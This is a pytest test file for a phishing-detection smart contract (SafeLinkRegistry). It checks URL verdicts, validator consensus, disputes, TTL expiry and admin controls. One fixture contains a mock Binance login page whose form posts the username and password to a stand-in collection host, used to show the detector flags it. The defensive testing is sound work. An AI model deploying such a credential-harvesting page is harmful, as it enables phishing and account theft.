"""Contract flow tests, run against the fake-genlayer stub (conftest).

These prove the state machine and the consensus path: leader fetches,
validator re-fetches and compares, verdict is written only on agreement,
disagreement / fetch failure writes nothing. They do NOT prove GenVM
lint or Studio consensus — see TEST_LOG.md.
"""

import pytest

from conftest import (
    ADMIN,
    OTHER,
    WEB_CALLS,
    WEB_RESPONSES,
    load_contract,
    reset_web,
    set_sender,
)

LEGIT_BODY = (
    "<html><head><title>Example</title></head>"
    "<body><h1>Hello</h1><p>Welcome.</p></body></html>"
)
PHISH_BODY = (
    '<html><body><h1>Binance Login</h1>'
    '<form action="https://evil-collect.example/steal">'
    '<input type="text" name="u">'
    '<input type="password" name="p">'
    "<button>Login</button></form></body></html>"
)
LOGIN_BODY = (
    "<html><body><form>"
    '<input type="text" name="u"><input type="password" name="p">'
    "</form></body></html>"
)


@pytest.fixture
def reg():
    reset_web()
    module, fake = load_contract()
    set_sender(fake, ADMIN)
    registry = module.SafeLinkRegistry()
    return registry, module, fake


def _serve(url, status, body):
    WEB_RESPONSES[url] = (status, body)


# -- deploy defaults ------------------------------------------------------


def test_deploy_defaults(reg):
    registry, _, _ = reg
    stats = registry.get_stats()
    assert stats["admin"] == ADMIN
    assert stats["total_entries"] == 0
    assert stats["check_count"] == 0
    assert stats["ttl_checks"] == 1000
    assert "binance.com" in stats["brands"]
    assert "genlayer.com" in stats["brands"]
    assert len(stats["brands"]) == 12


# -- check_url: happy paths ----------------------------------------------


def test_check_legit_url_is_safe_and_cached(reg):
    registry, _, _ = reg
    _serve("https://example.com", 200, LEGIT_BODY)
    first = registry.check_url("https://example.com/")
    assert first["verdict"] == "safe"
    assert first["cached"] is False
    assert first["fresh"] is True
    # Leader + validator = 2 fetches for one consensus round.
    assert len(WEB_CALLS) == 2
    assert registry.get_stats()["safe"] == 1
    assert registry.get_stats()["check_count"] == 1

    second = registry.check_url("HTTPS://example.com/#frag")
    assert second["verdict"] == "safe"
    assert second["cached"] is True
    assert len(WEB_CALLS) == 2  # no new fetch
    assert registry.get_stats()["check_count"] == 1


def test_check_phishing_url_is_malicious(reg):
    registry, _, _ = reg
    _serve("https://binance-secure-login.com/login", 200, PHISH_BODY)
    result = registry.check_url("https://binance-secure-login.com/login")
    assert result["verdict"] == "malicious"
    assert result["impersonates_brand"] == "binance.com"
    assert result["has_password_field"] is True
    assert result["off_host_form"] is True
    assert registry.get_stats()["malicious"] == 1


def test_check_http_login_is_malicious(reg):
    registry, _, _ = reg
    _serve("http://example.com/login", 200, LOGIN_BODY)
    assert registry.check_url("http://example.com/login")["verdict"] == (
        "malicious"
    )


def test_check_url_normalizes_key(reg):
    registry, _, _ = reg
    _serve("https://example.com/a", 200, LEGIT_BODY)
    registry.check_url("HTTPS://EXAMPLE.COM:443/a#x")
    assert registry.get_verdict("https://example.com/a")["verdict"] == "safe"
    assert registry.get_stats()["total_entries"] == 1


def test_is_safe_and_unchecked(reg):
    registry, _, _ = reg
    assert registry.is_safe("https://example.com/") is False
    assert registry.get_verdict("https://example.com/")["verdict"] == (
        "unchecked"
    )
    _serve("https://example.com", 200, LEGIT_BODY)
    registry.check_url("https://example.com/")
    assert registry.is_safe("https://example.com/") is True


# -- check_url: consensus failure writes nothing --------------------------


def test_validator_disagreement_writes_nothing(reg):
    registry, _, _ = reg
    # Leader sees the phishing page; the validator's re-fetch sees a
    # clean page. Signals differ -> validator disagrees -> undetermined.
    WEB_RESPONSES["https://example.com/login"] = [
        (200, PHISH_BODY),
        (200, LEGIT_BODY),
    ]
    with pytest.raises(RuntimeError, match="consensus failed"):
        registry.check_url("https://example.com/login")
    assert registry.get_verdict("https://example.com/login")["verdict"] == (
        "unchecked"
    )
    assert registry.get_stats()["total_entries"] == 0
    assert registry.get_stats()["check_count"] == 0


def test_fetch_failure_writes_nothing(reg):
    registry, _, _ = reg
    _serve("https://example.com/missing", 404, "not found")
    # Stub maps "undetermined" to RuntimeError; the real GenVM maps it
    # to an undetermined transaction. Either way: no state change.
    with pytest.raises(RuntimeError, match="consensus failed"):
        registry.check_url("https://example.com/missing")
    assert registry.get_stats()["total_entries"] == 0


def test_invalid_url_rejected_without_fetch(reg):
    registry, module, _ = reg
    with pytest.raises(module.gl.UserError):
        registry.check_url("ftp://example.com/x")
    with pytest.raises(module.gl.UserError):
        registry.check_url("")
    assert len(WEB_CALLS) == 0


# -- disputes and re-check --------------------------------------------------


def test_dispute_then_recheck_rewrites_verdict(reg):
    registry, _, _ = reg
    _serve("https://binance-secure-login.com/login", 200, PHISH_BODY)
    registry.check_url("https://binance-secure-login.com/login")
    disputed = registry.dispute_url(
        "https://binance-secure-login.com/login", "looks wrong"
    )
    assert disputed["verdict"] == "disputed"
    assert disputed["disputes"] == 1
    assert disputed["last_dispute_reason"] == "looks wrong"
    assert registry.is_safe("https://binance-secure-login.com/login") is False
    assert registry.get_stats()["disputed"] == 1
    assert registry.get_stats()["malicious"] == 0

    # Disputed entries are never served from cache: a re-check fetches.
    calls_before = len(WEB_CALLS)
    rechecked = registry.check_url("https://binance-secure-login.com/login")
    assert rechecked["verdict"] == "malicious"
    assert rechecked["cached"] is False
    assert rechecked["disputes"] == 1  # dispute history is preserved
    assert len(WEB_CALLS) > calls_before


def test_request_recheck_marks_disputed(reg):
    registry, _, _ = reg
    _serve("https://example.com", 200, LEGIT_BODY)
    registry.check_url("https://example.com/")
    result = registry.request_recheck("https://example.com/")
    assert result["verdict"] == "disputed"
    assert result["last_dispute_reason"] == "recheck requested"


def test_dispute_unknown_url_rejected(reg):
    registry, module, _ = reg
    with pytest.raises(module.gl.UserError):
        registry.dispute_url("https://example.com/", "nope")


# -- freshness / TTL ---------------------------------------------------------


def test_entry_goes_stale_after_ttl_checks(reg):
    registry, _, _ = reg
    registry.set_ttl_checks(1)
    _serve("https://example.com", 200, LEGIT_BODY)
    _serve("https://example.org", 200, LEGIT_BODY)
    registry.check_url("https://example.com/")
    assert registry.is_safe("https://example.com/") is True
    registry.check_url("https://example.org/")  # advances check_count
    assert registry.is_safe("https://example.com/") is False
    assert registry.get_verdict("https://example.com/")["fresh"] is False


# -- admin: brands and blocklist ----------------------------------------------


def test_non_admin_cannot_manage(reg):
    registry, module, fake = reg
    set_sender(fake, OTHER)
    with pytest.raises(module.gl.UserError):
        registry.add_brand("evil.example")
    with pytest.raises(module.gl.UserError):
        registry.block_host("evil.example")
    with pytest.raises(module.gl.UserError):
        registry.set_ttl_checks(5)


def test_brand_remove_and_readd(reg):
    registry, _, _ = reg
    assert "binance.com" in registry.get_brands()["brands"]
    registry.remove_brand("binance.com")
    assert "binance.com" not in registry.get_brands()["brands"]
    # A removed brand no longer triggers impersonation.
    _serve("https://binance-secure-login.com/login", 200, PHISH_BODY)
    result = registry.check_url("https://binance-secure-login.com/login")
    assert result["impersonates_brand"] == ""
    assert result["verdict"] == "malicious"  # still: password + off-host
    registry.add_brand("binance.com")
    assert "binance.com" in registry.get_brands()["brands"]


def test_block_host_makes_url_malicious(reg):
    registry, _, _ = reg
    registry.block_host("evil.example")
    assert registry.is_blocked("evil.example") is True
    assert registry.is_blocked("EVIL.EXAMPLE") is True
    _serve("https://evil.example", 200, LEGIT_BODY)
    assert registry.check_url("https://evil.example/")["verdict"] == (
        "malicious"
    )
    registry.unblock_host("evil.example")
    assert registry.is_blocked("evil.example") is False


def test_set_ttl_checks_rejects_zero(reg):
    registry, module, _ = reg
    with pytest.raises(module.gl.UserError):
        registry.set_ttl_checks(0)


# -- listing -------------------------------------------------------------------


def test_list_entries_newest_first_and_paginated(reg):
    registry, _, _ = reg
    for host in ("a.example", "b.example", "c.example"):
        _serve("https://" + host, 200, LEGIT_BODY)
        registry.check_url("https://" + host + "/")
    page = registry.list_entries(0, 2)
    assert page["total"] == 3
    assert [e["url"] for e in page["entries"]] == [
        "https://c.example",
        "https://b.example",
    ]
    page2 = registry.list_entries(2, 2)
    assert [e["url"] for e in page2["entries"]] == ["https://a.example"]
    assert registry.list_entries(99, 10)["entries"] == []
